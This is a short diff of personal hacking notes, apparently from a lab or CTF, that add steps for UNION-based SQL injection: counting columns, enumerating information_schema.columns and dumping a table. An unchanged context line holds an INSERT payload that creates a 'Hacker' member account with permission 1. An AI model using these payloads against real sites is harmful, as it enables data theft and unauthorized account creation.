@@ -8,4 +8,21 @@
 
 - cat index.html | grep class
 
+
+- Enter a search you know will return results (category=1), and note how many columns it has.
+
+- Based on the width,, you can now view all tables and its associated columns
+      - UNION SELECT table_name,1,column_name FROM information_schema.columns
+                                |
+                        "filler" column 
+      - every lowercase table-name is user-created, meaning you can/should query it
+
+- Begin to query each table you want. Query is limited to number of columns
+      - UNION SELECT comment,mime,id FROM share4
+                        |______|___|         |
+                               |             |
+                         column_name    table_name
+ 
+                          
+
 INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Stines', 'Hacker', 'password', /'ballz@gmail.com', 1)
